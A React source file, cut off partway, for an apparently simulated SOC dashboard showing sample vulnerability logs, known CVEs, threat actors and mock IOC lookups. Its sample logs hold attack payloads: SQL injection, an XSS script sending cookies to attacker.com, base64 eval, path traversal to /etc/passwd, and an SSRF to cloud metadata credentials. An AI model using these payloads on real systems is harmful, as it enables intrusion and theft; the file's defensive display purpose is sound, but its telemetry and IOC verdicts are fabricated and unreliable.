import React, { useState, useEffect, useRef } from 'react';
import {
  Radio,
  Pause,
  Play,
  Trash2,
  Download,
  Search,
  ChevronDown,
  ChevronUp,
  ShieldAlert,
  Cpu,
  Activity,
  Terminal,
  Shield,
  CheckCircle2,
  AlertTriangle,
  AlertCircle,
  RefreshCw,
  Wifi,
  Smartphone,
  Network,
  EyeOff,
  Lock,
  Signal,
  Zap,
  ShieldCheck,
  Globe,
  Server,
  ArrowUpRight,
  ArrowDownRight,
  Layers,
  Crosshair,
  Database,
  ExternalLink,
  Flame,
  RadioTower,
} from 'lucide-react';
import { networkStatusService } from '../services/networkStatusService';
import { ActiveTab } from '../types';

export interface TelemetryLog {
  id: string;
  timestamp: string;
  rawTime: number;
  type: 'CRITICAL' | 'WARN' | 'INFO' | 'SUCCESS';
  category: 'SAST' | 'HTTP' | 'OWASP' | 'EXPLOIT' | 'AUTH';
  message: string;
  targetModule: string;
  cwe: string;
  owaspCategory: string;
  sourceIp: string;
  payloadSnippet?: string;
  remediationAction?: string;
}

export interface NetworkDetails {
  connectionType: string;
  interfaceName: string;
  ssid: string;
  deviceName?: string;
  hotspotDeviceName?: string;
  hotspotDeviceIp?: string;
  hotspotStatus: string;
  tetheredClients: number;
  ipAddress: string;
  gateway: string;
  subnetMask: string;
  publicIp: string;
  linkSpeed: string;
  signalStrength: string;
  securityProtocol: string;
  passwordStatus: string;
  credentialsExposed: boolean;
  bandwidthUsed: string;
  dnsServers: string[];
  macAddress: string;
  frequency?: string;
  downlinkMbps?: number;
  rttLatency?: string;
  webrtcCandidate?: string;
}

const INITIAL_LOGS: TelemetryLog[] = [
  {
    id: 'log-101',
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100),
    rawTime: Date.now() - 5000,
    type: 'INFO',
    category: 'SAST',
    message: 'SaiVorex SAST AST Rule Engine v2.5 loaded with 1,480 active CWE signatures',
    targetModule: 'server/engine/sast_core.ts',
    cwe: 'CWE-693',
    owaspCategory: 'A05:2021-Security Misconfiguration',
    sourceIp: '127.0.0.1:3000',
    payloadSnippet: 'RULESET_LOAD_OK [OWASP Top 10 + CWE Top 25]',
    remediationAction: 'Continuous AST static rule evaluation active.',
  },
  {
    id: 'log-102',
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100),
    rawTime: Date.now() - 4000,
    type: 'CRITICAL',
    category: 'EXPLOIT',
    message: 'Unsanitized dynamic string concatenation detected in raw SQLite query block',
    targetModule: 'src/api/auth_controller.py:L42',
    cwe: 'CWE-89',
    owaspCategory: 'A03:2021-Injection',
    sourceIp: '192.168.1.104',
    payloadSnippet: "SELECT * FROM users WHERE username = '" + "admin' OR '1'='1" + "'",
    remediationAction: 'Enforce parameterized prepared statements with query bindings.',
  },
  {
    id: 'log-103',
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100),
    rawTime: Date.now() - 3000,
    type: 'WARN',
    category: 'HTTP',
    message: 'Header Scan Audit: Missing Strict-Transport-Security (HSTS) directive on target',
    targetModule: 'https://auth-api.vulnerable-demo.internal',
    cwe: 'CWE-523',
    owaspCategory: 'A05:2021-Security Misconfiguration',
    sourceIp: '10.0.42.15',
    payloadSnippet: 'HTTP/1.1 200 OK [HSTS Header: NOT_SET]',
    remediationAction: 'Inject HSTS header: max-age=31536000; includeSubDomains; preload.',
  },
  {
    id: 'log-104',
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100),
    rawTime: Date.now() - 2000,
    type: 'SUCCESS',
    category: 'SAST',
    message: 'Automated secure refactored code patch generated and validated clean',
    targetModule: 'server/engine/refactor_gen.ts',
    cwe: 'CWE-79',
    owaspCategory: 'A03:2021-Injection',
    sourceIp: '127.0.0.1:3000',
    payloadSnippet: 'DOMPurify.sanitize(userInput) applied successfully.',
    remediationAction: 'Patch deployed to secure preview staging.',
  },
  {
    id: 'log-105',
    timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100),
    rawTime: Date.now() - 1000,
    type: 'WARN',
    category: 'AUTH',
    message: 'High entropy hardcoded secret string detected in client script bundle',
    targetModule: 'public/js/app_config.js:L18',
    cwe: 'CWE-798',
    owaspCategory: 'A07:2021-Identification & Authentication Failures',
    sourceIp: '172.16.0.8',
    payloadSnippet: 'const API_KEY = "sk_live_9983728492018239482";',
    remediationAction: 'Extract secret to server-side process.env environment storage.',
  },
];

const TELEMETRY_GENERATOR_POOL = [
  {
    type: 'CRITICAL' as const,
    category: 'EXPLOIT' as const,
    message: 'SQL Injection tautology bypass vulnerability detected in query parser',
    targetModule: 'server/controllers/user_search.ts:L34',
    cwe: 'CWE-89',
    owaspCategory: 'A03:2021-Injection',
    payloadSnippet: "SELECT * FROM users WHERE email = 'admin@demo.org' OR '1'='1';",
    remediationAction: 'Convert raw strings into parameterized queries with type-safe parameters.',
  },
  {
    type: 'CRITICAL' as const,
    category: 'EXPLOIT' as const,
    message: 'Cross-Site Scripting (XSS) script injection vector matched in DOM rendering',
    targetModule: 'src/components/CommentBox.tsx:L82',
    cwe: 'CWE-79',
    owaspCategory: 'A03:2021-Injection',
    payloadSnippet: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    remediationAction: 'Sanitize HTML text using DOMPurify before setting dangerouslySetInnerHTML.',
  },
  {
    type: 'CRITICAL' as const,
    category: 'EXPLOIT' as const,
    message: 'Remote Code Execution vector matched via un-sanitized deserialization call',
    targetModule: 'services/payload_processor.ts:L88',
    cwe: 'CWE-502',
    owaspCategory: 'A08:2021-Software and Data Integrity Failures',
    payloadSnippet: 'eval(Buffer.from(encodedPayload, "base64").toString())',
    remediationAction: 'Replace dynamic eval calls with strict JSON schema validation.',
  },
  {
    type: 'CRITICAL' as const,
    category: 'HTTP' as const,
    message: 'Suspicious Phishing URL link detected (Spoofed domain & unencrypted HTTP)',
    targetModule: 'http://auth-login.vulnerable-bank-phish.dev',
    cwe: 'CWE-290',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    payloadSnippet: 'Unencrypted credential harvest form detected [Phishing Safety Score: 18%]',
    remediationAction: 'Enforce HTTPS SSL certificates and verify domain DKIM/SPF ownership.',
  },
  {
    type: 'WARN' as const,
    category: 'EXPLOIT' as const,
    message: 'Path Traversal relative file access payload attempted against endpoint',
    targetModule: 'api/download_file.ts:L19',
    cwe: 'CWE-22',
    owaspCategory: 'A01:2021-Broken Access Control',
    payloadSnippet: '../../../../etc/passwd',
    remediationAction: 'Sanitize path inputs with path.basename() and validate within root directory.',
  },
  {
    type: 'WARN' as const,
    category: 'EXPLOIT' as const,
    message: 'Server-Side Request Forgery (SSRF) internal network access vector detected',
    targetModule: 'services/fetch_preview.ts:L52',
    cwe: 'CWE-918',
    owaspCategory: 'A10:2021-Server-Side Request Forgery',
    payloadSnippet: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    remediationAction: 'Restrict outgoing HTTP requests using an IP address whitelist.',
  },
  {
    type: 'WARN' as const,
    category: 'HTTP' as const,
    message: 'Content Security Policy (CSP) contains unsafe-inline directive',
    targetModule: 'https://gateway.internal.net',
    cwe: 'CWE-1021',
    owaspCategory: 'A05:2021-Security Misconfiguration',
    payloadSnippet: "Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'",
    remediationAction: 'Refactor CSP to enforce nonce-based or hash-based script execution.',
  },
  {
    type: 'SUCCESS' as const,
    category: 'SAST' as const,
    message: 'Zero vulnerability findings reported on refactored parameterized query',
    targetModule: 'db/query_builder.ts:L104',
    cwe: 'CWE-89',
    owaspCategory: 'A03:2021-Injection',
    payloadSnippet: 'db.query("SELECT * FROM users WHERE id = ?", [userId])',
    remediationAction: 'Verified compliant with OWASP A03 injection guidelines.',
  },
  {
    type: 'INFO' as const,
    category: 'OWASP' as const,
    message: 'OWASP Top 10 matrix compliance scan synchronized across all 10 threat pillars',
    targetModule: 'core/owasp_matrix.ts',
    cwe: 'CWE-1000',
    owaspCategory: 'A01:2021-Broken Access Control',
    payloadSnippet: 'OWASP_AUDIT_SYNC_COMPLETE [10/10 Pillars Passed]',
    remediationAction: 'Maintain periodic automated SAST monitoring.',
  },
];

interface CveItem {
  id: string;
  name: string;
  cvss: number;
  epss: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  status: string;
  target: string;
  description: string;
  patch: string;
}

const KNOWN_EXPLOITED_VULNS: CveItem[] = [
  {
    id: 'CVE-2024-3400',
    name: 'Palo Alto PAN-OS GlobalProtect Command Injection',
    cvss: 10.0,
    epss: '94.2%',
    severity: 'CRITICAL',
    status: 'ACTIVE IN WILD',
    target: 'Firewall Gateway / GlobalProtect Portal',
    description: 'Unauthenticated arbitrary code execution with root privileges via crafted session cookies.',
    patch: 'Upgrade PAN-OS to 11.1.2-h3 / 11.0.4-h1 or disable Device Telemetry.',
  },
  {
    id: 'CVE-2024-6387',
    name: 'OpenSSH regreSSHion Signal Handler Race Condition',
    cvss: 8.1,
    epss: '48.7%',
    severity: 'HIGH',
    status: 'EXPLOITED',
    target: 'sshd Daemon (Linux glibc-based systems)',
    description: 'Remote unauthenticated root code execution via SIGALRM race condition in sshd on glibc.',
    patch: 'Upgrade OpenSSH to >= 9.8p1 or set LoginGraceTime 0 in sshd_config.',
  },
  {
    id: 'CVE-2024-21887',
    name: 'Ivanti Connect Secure & Policy Secure Web Shell Injection',
    cvss: 9.1,
    epss: '91.8%',
    severity: 'CRITICAL',
    status: 'ACTIVE IN WILD',
    target: 'VPN Appliance Web Management Interface',
    description: 'Command injection vulnerability in web components allows authenticated admins to send arbitrary requests.',
    patch: 'Apply Ivanti Integrity Checker Tool (ICT) & patch package release.',
  },
  {
    id: 'CVE-2024-27198',
    name: 'JetBrains TeamCity Server Authentication Bypass',
    cvss: 9.8,
    epss: '86.4%',
    severity: 'CRITICAL',
    status: 'AUTOMATED BOTS',
    target: 'CI/CD Build Server & Agent Controller',
    description: 'Alternative path traversal bypasses authentication filters allowing full administrative takeover.',
    patch: 'Update TeamCity to version 2023.11.4 or apply official security plugin.',
  },
];

interface ThreatActor {
  name: string;
  alias: string;
  origin: string;
  motive: string;
  targets: string;
  ttp: string;
  activeStatus: 'ELEVATED' | 'CRITICAL' | 'MONITORED';
}

const THREAT_ACTORS: ThreatActor[] = [
  {
    name: 'Volt Typhoon',
    alias: 'BRONZE SILHOUETTE / Vanguard Panda',
    origin: 'East Asia',
    motive: 'Critical Infrastructure Pre-positioning & Espionage',
    targets: 'Water, Energy, Telecommunications, Transport',
    ttp: 'Living-off-the-land (LotL), SOHO router botnets, valid admin credentials',
    activeStatus: 'CRITICAL',
  },
  {
    name: 'LockBit 3.0',
    alias: 'Bitwise Spider / LockBit Black',
    origin: 'Eastern Europe / Transnational',
    motive: 'Financial Extortion & Data Ransomware',
    targets: 'Healthcare, Finance, Manufacturing, Government',
    ttp: 'Double extortion, StealBit exfiltration, compromised RDP, privilege escalation',
    activeStatus: 'CRITICAL',
  },
  {
    name: 'APT29',
    alias: 'Midnight Blizzard / Cozy Bear / Nobelium',
    origin: 'Eastern Europe',
    motive: 'Strategic Intelligence & Cloud Environment Theft',
    targets: 'Diplomatic, Defense, Cloud Service Providers',
    ttp: 'OAuth token theft, password spraying, residential proxies, supply-chain hooks',
    activeStatus: 'ELEVATED',
  },
  {
    name: 'Lazarus Group',
    alias: 'HIDDEN COBRA / Zinc',
    origin: 'East Asia',
    motive: 'Cryptocurrency Theft & Defense Espionage',
    targets: 'Web3, FinTech, Aerospace, Defense Contractors',
    ttp: 'Trojanized open-source packages, social engineering, cross-platform RATs',
    activeStatus: 'ELEVATED',
  },
];

interface LiveTelemetryProps {
  initialMode?: 'telemetry' | 'threatintel';
  onNavigateTab?: (tab: ActiveTab) => void;
}

export const LiveTelemetry: React.FC<LiveTelemetryProps> = ({
  initialMode = 'telemetry',
  onNavigateTab,
}) => {
  const [activeMode, setActiveMode] = useState<'telemetry' | 'threatintel'>(initialMode);

  useEffect(() => {
    if (initialMode) {
      setActiveMode(initialMode);
    }
  }, [initialMode]);

  const handleModeSwitch = (mode: 'telemetry' | 'threatintel') => {
    setActiveMode(mode);
    onNavigateTab?.(mode);
  };

  const [logs, setLogs] = useState<TelemetryLog[]>(INITIAL_LOGS);
  const [isLive, setIsLive] = useState<boolean>(true);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [selectedCategory, setSelectedCategory] = useState<string>('ALL');
  const [expandedLogId, setExpandedLogId] = useState<string | null>(null);
  const [eventRate, setEventRate] = useState<number>(18);
  const [activeThreats, setActiveThreats] = useState<number>(2);

  const [latencyHistory, setLatencyHistory] = useState<number[]>([22, 24, 21, 26, 23, 19, 24, 22, 25, 20]);
  const [currentPingMs, setCurrentPingMs] = useState<number>(22);

  const [selectedNetType, setSelectedNetType] = useState<'auto' | 'wifi' | 'ethernet' | 'hotspot'>('auto');
  const [customSsidName, setCustomSsidName] = useState<string>(() => networkStatusService.getStatus().name || "Thanvan's iPhone Hotspot");
  const [isScanningNetwork, setIsScanningNetwork] = useState<boolean>(false);
  const [detectionModeText, setDetectionModeText] = useState<string>('AUTO-DETECTED');
  const [networkInfo, setNetworkInfo] = useState<NetworkDetails>(() => {
    const initial = networkStatusService.getStatus();
    const isHotspot = initial.isHotspot || initial.type === 'hotspot';
    return {
      connectionType: isHotspot ? 'Mobile Hotspot / Cellular Tethering' : initial.type === 'ethernet' ? 'Ethernet (Wired LAN)' : 'Wi-Fi (Wireless LAN)',
      interfaceName: isHotspot ? 'wlan1 (Tethered Mobile Interface)' : initial.type === 'ethernet' ? 'eth0 (Realtek PCIe GbE Adapter)' : 'wlan0 (Intel® Wi-Fi 6E AX211)',
      ssid: initial.name || (isHotspot ? "Thanvan's iPhone Hotspot" : 'Wi-Fi_Network_5G'),
      deviceName: initial.deviceName || (isHotspot ? "Thanvan's iPhone 15 Pro" : 'Wi-Fi 6 Router AP'),
      hotspotDeviceName: initial.deviceName || (isHotspot ? "Thanvan's iPhone 15 Pro" : 'Wi-Fi 6 Router AP'),
      hotspotDeviceIp: initial.hotspotDeviceIp || (isHotspot ? '172.20.10.1' : '192.168.1.1'),
      hotspotStatus: isHotspot ? `Active Tethering to ${initial.deviceName || "Thanvan's iPhone 15 Pro"}` : 'Connected to Access Point',
      tetheredClients: isHotspot ? 2 : 0,
      ipAddress: initial.ipAddress || (isHotspot ? '172.20.10.2' : '192.168.1.104'),
      gateway: initial.hotspotDeviceIp || initial.gateway || (isHotspot ? '172.20.10.1' : '192.168.1.1'),
      subnetMask: '255.255.255.0',
      publicIp: '185.220.101.42',
      linkSpeed: initial.linkSpeed || (isHotspot ? '150 Mbps (Cellular 5G)' : '866 Mbps (5 GHz Band)'),
      signalStrength: initial.signalStrength || '-48 dBm (96% - Excellent)',
      securityProtocol: 'WPA3-Personal / WPA2 Enterprise',
      passwordStatus: '•••••••••••• [HIDDEN FOR PRIVACY / MASKED BY POLICY]',
      credentialsExposed: false,
      bandwidthUsed: '2.45 GB Session Data',
      dnsServers: ['1.1.1.1', initial.hotspotDeviceIp || '172.20.10.1'],
      macAddress: 'AC:82:47:1B:9D:62',
    };
  });

  const [iocSearchInput, setIocSearchInput] = useState<string>('185.220.101.42');
  const [iocResult, setIocResult] = useState<{
    query: string;
    type: string;
    riskScore: number;
    verdict: 'MALICIOUS' | 'SUSPICIOUS' | 'CLEAN';
    asn: string;
    location: string;
    threatActor: string;
    malwareFamily: string;
    lastSeen: string;
    reports: number;
  } | null>({
    query: '185.220.101.42',
    type: 'IPv4 Address',
    riskScore: 94,
    verdict: 'MALICIOUS',
    asn: 'AS208323 (Tor Exit Relay Node / CyberBunker)',
    location: 'Frankfurt, DE (Germany)',
    threatActor: 'Volt Typhoon / Credential Stuffing Proxy',
    malwareFamily: 'Mirai Scanner & Cobalt Strike Beacon',
    lastSeen: '2 minutes ago',
    reports: 342,
  });

  useEffect(() => {
    const unsub = networkStatusService.subscribe((st) => {
      const isHotspot = st.isHotspot || st.type === 'hotspot';
      setCustomSsidName(st.name || '');
      setNetworkInfo((prev) => ({
        ...prev,
        connectionType: isHotspot ? 'Mobile Hotspot / Cellular Tethering' : st.type === 'ethernet' ? 'Ethernet (Wired LAN)' : 'Wi-Fi (Wireless LAN)',
        ssid: st.name || prev.ssid,
        deviceName: st.deviceName || prev.deviceName,
        hotspotDeviceName: st.deviceName || prev.hotspotDeviceName,
        hotspotDeviceIp: st.hotspotDeviceIp || prev.hotspotDeviceIp,
        gateway: st.hotspotDeviceIp || st.gateway || prev.gateway,
        ipAddress: st.ipAddress || prev.ipAddress,
        linkSpeed: st.linkSpeed || prev.linkSpeed,
        signalStrength: st.signalStrength || prev.signalStrength,
        frequency: st.frequency || prev.frequency,
        downlinkMbps: st.downlinkMbps,
        webrtcCandidate: st.webrtcLocalCandidate || prev.webrtcCandidate,
        hotspotStatus: isHotspot ? `Active Tethering to ${st.deviceName || "Thanvan's iPhone 15 Pro"}` : 'Connected to Access Point',
      }));
    });
    return unsub;
  }, []);

  const handleScanNetwork = async (
    typeOverride?: 'auto' | 'wifi' | 'ethernet' | 'hotspot',
    overrideSsid?: string,
    overrideDeviceName?: string,
    overrideDeviceIp?: string
  ) => {
    const mode = typeOverride !== undefined ? typeOverride : selectedNetType;
    setIsScanningNetwork(true);

    const navConn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;

    let measuredRtt = 22;
    try {
      const t0 = performance.now();
      await fetch('/api/health', { method: 'HEAD', cache: 'no-store' });
      measuredRtt = Math.max(2, Math.round(performance.now() - t0));
    } catch {
    }

    setCurrentPingMs(measuredRtt);
    setLatencyHistory((prev) => [...prev.slice(1), measuredRtt]);

    let resolvedType: 'wifi' | 'ethernet' | 'hotspot' = 'wifi';

    if (mode === 'auto') {
      setDetectionModeText('AUTO-DETECTED');
      if (navConn?.type === 'ethernet') {
        resolvedType = 'ethernet';
      } else if (navConn?.type === 'cellular') {
        resolvedType = 'hotspot';
      } else if (navConn?.type === 'wifi') {
        resolvedType = 'wifi';
      } else {
        if (measuredRtt < 10 && navConn?.downlink > 50) {
          resolvedType = 'ethernet';
        } else {
          resolvedType = 'wifi';
        }
      }
    } else {
      setDetectionModeText('MANUAL OVERRIDE');
      resolvedType = mode;
    }

    const currentStatus = networkStatusService.getStatus();

    try {
      const response = await fetch('/api/scan-network', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          networkType: resolvedType,
          clientType: navConn?.type,
          effectiveType: navConn?.effectiveType,
          downlink: navConn?.downlink,
          rtt: measuredRtt,
          onlineStatus: navigator.onLine,
          customSsid: overrideSsid !== undefined ? overrideSsid : customSsidName || currentStatus.name || undefined,
          deviceName: overrideDeviceName || currentStatus.deviceName || undefined,
          hotspotDeviceIp: overrideDeviceIp || currentStatus.hotspotDeviceIp || undefined,
        }),
      });
      const data = await response.json();
      if (data.networkDetails) {
        setNetworkInfo(data.networkDetails);

        const now = new Date();
        const timeStr = now.toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100);
        const scanLog: TelemetryLog = {
          id: `log-net-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
          timestamp: timeStr,
          rawTime: Date.now(),
          type: 'INFO',
          category: 'HTTP',
          message: `Network Interface Synchronized: Connected via ${data.networkDetails.connectionType} [Device: ${data.networkDetails.deviceName || 'Personal Hotspot'} | IP: ${data.networkDetails.hotspotDeviceIp || data.networkDetails.gateway}]`,
          targetModule: data.networkDetails.interfaceName,
          cwe: 'CWE-200',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          sourceIp: data.networkDetails.ipAddress,
          payloadSnippet: `Device: ${data.networkDetails.deviceName} | Hotspot IP: ${data.networkDetails.hotspotDeviceIp || data.networkDetails.gateway} | Speed: ${data.networkDetails.linkSpeed}`,
          remediationAction: 'Credentials & WPA keys masked in compliance with privacy policy.',
        };
        setLogs((prev) => [scanLog, ...prev.slice(0, 49)]);
      }
    } catch (err) {
      console.error('Network scan failed:', err);
    } finally {
      setTimeout(() => setIsScanningNetwork(false), 300);
    }
  };

  useEffect(() => {
    handleScanNetwork();
  }, []);

  useEffect(() => {
    const pingInterval = setInterval(() => {
      const jitter = Math.floor(Math.random() * 8) - 4;
      const nextPing = Math.max(12, Math.min(48, currentPingMs + jitter));
      setCurrentPingMs(nextPing);
      setLatencyHistory((prev) => [...prev.slice(1), nextPing]);
    }, 2800);
    return () => clearInterval(pingInterval);
  }, [currentPingMs]);

  useEffect(() => {
    if (!isLive) return;

    const interval = setInterval(() => {
      const template = TELEMETRY_GENERATOR_POOL[Math.floor(Math.random() * TELEMETRY_GENERATOR_POOL.length)];
      const now = new Date();
      const timeStr = now.toLocaleTimeString('en-US', { hour12: false }) + '.' + Math.floor(Math.random() * 900 + 100);

      const newLog: TelemetryLog = {
        id: `log-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
        timestamp: timeStr,
        rawTime: Date.now(),
        type: template.type,
        category: template.category,
        message: template.message,
        targetModule: template.targetModule,
        cwe: template.cwe,
        owaspCategory: template.owaspCategory,
        sourceIp: `192.168.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 250)}`,
        payloadSnippet: template.payloadSnippet,
        remediationAction: template.remediationAction,
      };

      setLogs((prev) => [newLog, ...prev.slice(0, 49)]);
      setEventRate(Math.floor(14 + Math.random() * 12));
    }, 3800);

    return () => clearInterval(interval);
  }, [isLive]);

  useEffect(() => {
    const critCount = logs.filter((l) => l.type === 'CRITICAL').length;
    setActiveThreats(critCount);
  }, [logs]);

  const filteredLogs = logs.filter((log) => {
    const matchesSearch =
      searchQuery === '' ||
      log.message.toLowerCase().includes(searchQuery.toLowerCase()) ||
      log.cwe.toLowerCase().includes(searchQuery.toLowerCase()) ||
      log.targetModule.toLowerCase().includes(searchQuery.toLowerCase()) ||
      log.category.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesCategory =
      selectedCategory === 'ALL' ||
      (selectedCategory === 'CRITICAL' && log.type === 'CRITICAL') ||
      (selectedCategory === 'WARN' && log.type === 'WARN') ||
      (selectedCategory === 'SAST' && log.category === 'SAST') ||
      (selectedCategory === 'HTTP' && log.category === 'HTTP') ||
      (selectedCategory === 'EXPLOIT' && log.category === 'EXPLOIT');

    return matchesSearch && matchesCategory;
  });

  const handleExportLogs = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(logs, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `SaiVorex-Telemetry-Logs-${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  const handleClearLogs = () => {
    setLogs([]);
  };

  const handleExecuteIocLookup = (queryTerm: string) => {
    const clean = queryTerm.trim();
    if (!clean) return;

    if (clean.includes('185.220') || clean.includes('tor')) {
      setIocResult({
        query: clean,
        type: 'IPv4 Address',
        riskScore: 94,
        verdict: 'MALICIOUS',
        asn: 'AS208323 (Tor Exit Node)',
        location: 'Frankfurt, DE',
        threatActor: 'Volt Typhoon / Credential Stuffing Proxy',
        malwareFamily: 'Mirai Scanner & Cobalt Strike Beacon',
        lastSeen: 'Just now',
        reports: 342,
      });
    } else if (clean.includes('45.154') || clean.includes('mirai')) {
      setIocResult({
        query: clean,
        type: 'IPv4 Address',
        riskScore: 98,
        verdict: 'MALICIOUS',
        asn: 'AS44050 (Bulletproof Hosting)',
        location: 'Moscow, RU',
        threatActor: 'Lazarus / LockBit Affiliate',
        malwareFamily: 'Mirai IoT DDoS Botnet',
        lastSeen: '4 minutes ago',
        reports: 512,
      });
    } else if (clean.toLowerCase().includes('cve-2024-3400')) {
      setIocResult({
        query: clean,
        type: 'CVE Vulnerability Identifier',
        riskScore: 100,
        verdict: 'MALICIOUS',
        asn: 'N/A (Software Vulnerability)',
        location: 'Global Attack Footprint',
        threatActor: 'UTA0218 (State-Sponsored)',
        malwareFamily: 'Upstyle Python Web Shell',
        lastSeen: '1 minute ago',
        reports: 1289,
      });
    } else {
      setIocResult({
        query: clean,
        type: 'Domain / Hostname',
        riskScore: 78,
        verdict: 'SUSPICIOUS',
        asn: 'AS13335 (Cloudflare CDN Routed)',
        location: 'Ashburn, US',
        threatActor: 'Scattered Spider Phishing Kit',
        malwareFamily: 'EvilProxy Reverse Proxy Token Harvester',
        lastSeen: '18 minutes ago',
        reports: 89,
      });
    }
  };

  return (
    <div className="space-y-5">
      <div className="p-4 bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 rounded-2xl shadow-[0_8px_32px_rgba(0,0,0,0.4)] flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <span className="text-sm font-extrabold text-white tracking-wide flex items-center gap-1.5">
              <span>Cyber Telemetry & Intelligence Core</span>
              <span className="text-cyan-400">SOC</span>
            </span>
            <span className="px-2 py-0.5 rounded-md text-[10px] font-mono font-bold bg-cyan-500/10 text-cyan-300 border border-cyan-400/30">
              v2.5 OPERATIONAL
            </span>
          </div>
          <p className="text-xs text-slate-400 mt-0.5">
            Switch between real-time local network interface telemetry and global threat intelligence feeds.
          </p>
        </div>

        <div className="flex items-center p-1 bg-black/40 border border-white/10 rounded-xl">
          <button
            onClick={() => handleModeSwitch('telemetry')}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-bold font-mono transition-all ${
              activeMode === 'telemetry'
                ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-[0_0_20px_rgba(6,182,212,0.4)]'
                : 'text-slate-400 hover:text-white hover:bg-white/5'
            }`}
          >
            <Activity className="w-3.5 h-3.5" />
            <span>Network Telemetry</span>
            <span className="px-1.5 py-0.2 text-[9px] rounded bg-black/30 border border-white/10 text-cyan-300">
              {currentPingMs}ms
            </span>
          </button>

          <button
            onClick={() => handleModeSwitch('threatintel')}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-bold font-mono transition-all ${
              activeMode === 'threatintel'
                ? 'bg-gradient-to-r from-rose-500 to-red-600 text-white shadow-[0_0_20px_rgba(244,63,94,0.4)]'
                : 'text-slate-400 hover:text-white hover:bg-white/5'
            }`}
          >
            <Radio className="w-3.5 h-3.5" />
            <span>Threat Intelligence</span>
            <span className="px-1.5 py-0.2 text-[9px] rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
              {activeThreats} THREATS
            </span>
          </button>
        </div>
      </div>

      {activeMode === 'telemetry' && (
        <div className="space-y-4">
          <div className="bg-[#060e22]/55 backdrop-blur-2xl border border-white/10 p-5 rounded-2xl space-y-4 shadow-[0_8px_32px_rgba(0,0,0,0.4)] relative overflow-hidden">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 border-b border-white/10 pb-4">
              <div className="flex items-center gap-3">
                <div className="p-2.5 bg-gradient-to-br from-cyan-500/20 to-blue-600/20 border border-cyan-400/40 rounded-xl text-cyan-400 shadow-[0_0_15px_rgba(6,182,212,0.3)]">
                  <Activity className="w-5 h-5" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-white text-sm tracking-wide">
                      Host Network Interface & Adapter Telemetry
                    </span>
                    <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[10px] rounded-md font-mono font-bold flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      CONNECTED
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Real-time hardware adapter telemetry, Wi-Fi 6E/5G hotspot cellular tethering & gateway routing.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 flex-wrap">
                <div className="flex items-center p-1 bg-black/40 border border-white/10 rounded-xl">
                  <button
                    onClick={() => {
                      setSelectedNetType('auto');
                      networkStatusService.resetToAutoDetect();
                      handleScanNetwork('auto');
                    }}
                    className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 ${
                      selectedNetType === 'auto'
                        ? 'bg-cyan-500 text-slate-950 font-black shadow-[0_0_12px_rgba(6,182,212,0.5)]'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Zap className="w-3 h-3 fill-current" />
                    <span>Auto-Detect</span>
                  </button>

                  <button
                    onClick={() => {
                      setSelectedNetType('wifi');
                      networkStatusService.setNetworkType('wifi', { networkName: 'Cyber_Home_Fiber_5G', deviceName: 'Wi-Fi 6 Router AP', hotspotDeviceIp: '192.168.1.1' });
                      handleScanNetwork('wifi', 'Cyber_Home_Fiber_5G', 'Wi-Fi 6 Router AP', '192.168.1.1');
                    }}
                    className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 ${
                      selectedNetType === 'wifi' ? 'bg-emerald-500 text-slate-950 font-black' : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    <Wifi className="w-3 h-3" />
                    <span>Wi-Fi</span>
                  </button>

                  <button
                    onClick={() => {
                      setSelectedNetType('ethernet');
                      networkStatusService.setNetworkType('ethernet', { networkName: 'Gigabit_Ethernet_LAN', deviceName: 'Cisco Gigabit LAN Gateway', hotspotDeviceIp: '10.0.0.1' });
                      handleScanNetwork('ethernet', 'Gigabit_Ethernet_LAN', 'Cisco Gigabit LAN Gateway', '10.0.0.1');
                    }}
                    className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 ${
